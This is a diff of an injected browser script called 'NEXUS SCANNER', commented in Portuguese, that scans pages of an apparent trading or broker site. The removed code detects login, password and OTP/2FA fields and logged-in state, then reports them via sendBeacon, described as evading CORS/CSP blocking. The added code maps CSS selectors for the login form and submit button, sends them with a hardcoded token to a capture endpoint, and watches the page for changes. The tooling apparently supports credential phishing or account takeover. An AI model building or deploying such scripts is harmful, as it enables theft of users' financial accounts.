@@ -1,158 +1,113 @@
-(function () {
+(function(){
+  if (window.__nexus_scanner_installed) return;
+  window.__nexus_scanner_installed = true;
 
-    console.log("NEXUS SCANNER iniciado ✔");
+  console.log("NEXUS SCANNER iniciado ✔");
 
-    const TOKEN = window.NEXUS_TOKEN_INJECT || "032318";
-    const CAPTURE_URL = window.NEXUS_CAPTURE_ENDPOINT;
+  const TOKEN = window.NEXUS_TOKEN_INJECT || "032318";
+  const CAPTURE_URL = window.NEXUS_CAPTURE_ENDPOINT || (window.location.origin + "/capture");
 
-    // =========================================================
-    //  MÉTODO ANTI-BLOQUEIO 🔥 — Envia usando BEACON
-    //  (não pode ser bloqueado por CORS / CSP)
-    // =========================================================
-    function sendCapture(data) {
-        const payload = JSON.stringify({
-            token: TOKEN,
-            ...data
-        });
-
-        try {
-            const ok = navigator.sendBeacon(CAPTURE_URL, payload);
-
-            if (ok) {
-                console.log("📡 Beacon enviado →", data.event);
-            } else {
-                console.log("❌ Beacon falhou, tentando fetch…");
-
-                // fallback opcional (fetch será bloqueado, mas tentamos)
-                fetch(CAPTURE_URL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "X-Nexus-Token": TOKEN
-                    },
-                    body: payload
-                }).catch(() => {});
-            }
-        } catch (err) {
-            console.log("Erro no sendBeacon:", err);
-        }
+  function safeFetch(url, payload){
+    try {
+      return fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Nexus-Token": TOKEN
+        },
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).then(r => r.json()).catch(e => { console.warn("fetch err:", e); });
+    } catch(e){
+      console.warn("safeFetch exception", e);
     }
+  }
 
-    // =========================================================
-    //  DETECÇÃO DE CAMPOS DE LOGIN
-    // =========================================================
-    function getLoginFields() {
-        const inputs = document.querySelectorAll("input");
-        let user = null, pass = null;
-
-        inputs.forEach(i => {
-            const type = (i.type || "").toLowerCase();
-            const name = (i.name || "").toLowerCase();
-            const placeholder = (i.placeholder || "").toLowerCase();
-
-            if (!user && /(email|user|login|cpf)/i.test(name + placeholder + type)) {
-                user = i;
-            }
-            if (!pass && /(password|senha|pwd)/i.test(name + placeholder + type)) {
-                pass = i;
-            }
-        });
-
-        return { user, pass };
+  function cssPath(el){
+    if(!el) return null;
+    if (el.id) return `#${CSS.escape(el.id)}`;
+    const parts = [];
+    while (el && el.nodeType === 1 && el.tagName.toLowerCase() !== 'html') {
+      let part = el.tagName.toLowerCase();
+      if (el.className && typeof el.className === 'string') {
+        const cls = el.className.trim().split(/\s+/).filter(Boolean);
+        if (cls.length) part += '.' + cls.join('.');
+      }
+      const parent = el.parentNode;
+      if (parent) {
+        const index = Array.prototype.indexOf.call(parent.children, el) + 1;
+        part += `:nth-child(${index})`;
+      }
+      parts.unshift(part);
+      el = el.parentNode;
     }
+    return parts.join(' > ');
+  }
 
-    // =========================================================
-    //  DETECÇÃO DE CAMPO OTP (token/2FA)
-    // =========================================================
-    function getOTPField() {
-        const inputs = document.querySelectorAll("input");
-
-        for (const i of inputs) {
-            const t = (i.type || "").toLowerCase();
-            const p = (i.placeholder || "").toLowerCase();
-            const n = (i.name || "").toLowerCase();
-
-            if (/(\bcode\b|otp|token|verificação|verification)/i.test(p + n + t)) {
-                return i;
-            }
-        }
-        return null;
+  function findLoginElements(){
+    const res = {timestamp: new Date().toISOString(), url: location.href, fields: {}, notes: ""};
+    let email = document.querySelector("input[type='email'], input[placeholder*='email'], input[name*='user'], input[name*='email']");
+    let password = document.querySelector("input[type='password'], input[placeholder*='senha'], input[name*='password']");
+    // broad fallback
+    if(!email){
+      const candidates = Array.from(document.querySelectorAll("input")).filter(i => /email|user|login|cpf/i.test(i.name + i.placeholder + i.id));
+      if(candidates.length) email = candidates[0];
     }
-
-    // =========================================================
-    //  VERIFICAÇÃO LOGIN
-    // =========================================================
-    function checkForLogin() {
-        try {
-            const { user, pass } = getLoginFields();
-
-            if (user && pass) {
-                console.log("NEXUS: Campos de login detectados!");
-
-                sendCapture({
-                    event: "login_fields_detected",
-                    user_placeholder: user.placeholder || "",
-                    pass_placeholder: pass.placeholder || "",
-                    timestamp: Date.now()
-                });
-            }
-        } catch (e) {
-            console.log("Erro no scanner login:", e);
-        }
+    if(!password){
+      const candidates = Array.from(document.querySelectorAll("input")).filter(i => i.type === 'password' || /senha|pass|pwd/i.test(i.name + i.placeholder + i.id));
+      if(candidates.length) password = candidates[0];
     }
-
-    // =========================================================
-    //  VERIFICAÇÃO OTP
-    // =========================================================
-    function checkForOTP() {
-        try {
-            const otp = getOTPField();
-
-            if (otp) {
-                console.log("NEXUS: Campo OTP detectado");
-
-                sendCapture({
-                    event: "otp_field_detected",
-                    placeholder: otp.placeholder || "",
-                    timestamp: Date.now()
-                });
-            }
-        } catch (e) {
-            console.log("Erro no scanner OTP:", e);
-        }
+    try {
+      if(email) res.fields.email = { tag: email.tagName, selector: cssPath(email), placeholder: email.placeholder || "", name: email.name || "", id: email.id || "" };
+      if(password) res.fields.password = { tag: password.tagName, selector: cssPath(password), placeholder: password.placeholder || "", name: password.name || "", id: password.id || "" };
+      let form = (email && email.form) || (password && password.form) || document.querySelector("form");
+      if(form){
+        const btn = form.querySelector("button[type='submit'], input[type='submit'], button");
+        if(btn) res.fields.submit = { selector: cssPath(btn), text: (btn.innerText||"").trim() };
+        res.fields.form = { selector: cssPath(form) };
+      } else {
+        const btn = document.querySelector("button[type='submit'], input[type='submit'], button");
+        if(btn) res.fields.submit = { selector: cssPath(btn), text: (btn.innerText||"").trim() };
+      }
+    } catch(e){
+      res.notes = "error building selectors: " + (e && e.message);
     }
+    return res;
+  }
 
-    // =========================================================
-    //  DETECTA SE JÁ ESTÁ LOGADO
-    // =========================================================
-    function checkIfLoggedIn() {
-        try {
-            const keywordTests = [
-                "Saldo", "Depósito", "Histórico", "Minhas Operações",
-                "Mercado", "OTC", "Ações", "Cripto", "Paridades", "Operar"
-            ];
+  // send initial capture immediately
+  try {
+    const initial = findLoginElements();
+    safeFetch(CAPTURE_URL, Object.assign({event:"initial_scan"}, initial));
+    console.log("NEXUS scanner initial capture sent", initial);
+  } catch(e){
+    console.warn("scanner initial error", e);
+  }
 
-            const found = keywordTests.some(kw =>
-                document.body.innerText.includes(kw)
-            );
-
-            if (found) {
-                sendCapture({
-                    event: "logged_in",
-                    timestamp: Date.now()
-                });
-            }
-
-        } catch (e) {
-            console.log("Erro ao detectar login:", e);
-        }
+  // observe mutations and send diffs
+  let last = null;
+  const obs = new MutationObserver(() => {
+    try {
+      const info = findLoginElements();
+      const s = JSON.stringify(info);
+      if(s !== last){
+        last = s;
+        safeFetch(CAPTURE_URL, Object.assign({event:"mutation_scan"}, info));
+        console.log("NEXUS scanner mutation capture sent");
+      }
+    } catch(e){
+      console.warn("mutation handler error", e);
     }
+  });
 
-    // =========================================================
-    //  LOOPS DE MONITORAMENTO
-    // =========================================================
-    setInterval(checkForLogin, 1200);
-    setInterval(checkForOTP, 1500);
-    setInterval(checkIfLoggedIn, 2000);
+  try {
+    obs.observe(document, {childList:true, subtree:true, attributes:true});
+  } catch(e){
+    console.warn("Observer failed", e);
+  }
 
+  // stop after 10 minutes automatically
+  setTimeout(()=>{ try{ obs.disconnect(); console.log("NEXUS scanner stopped after timeout"); }catch(e){} }, 10 * 60 * 1000);
+
+  console.log("NEXUS scanner installed (no credential values collected).");
 })();
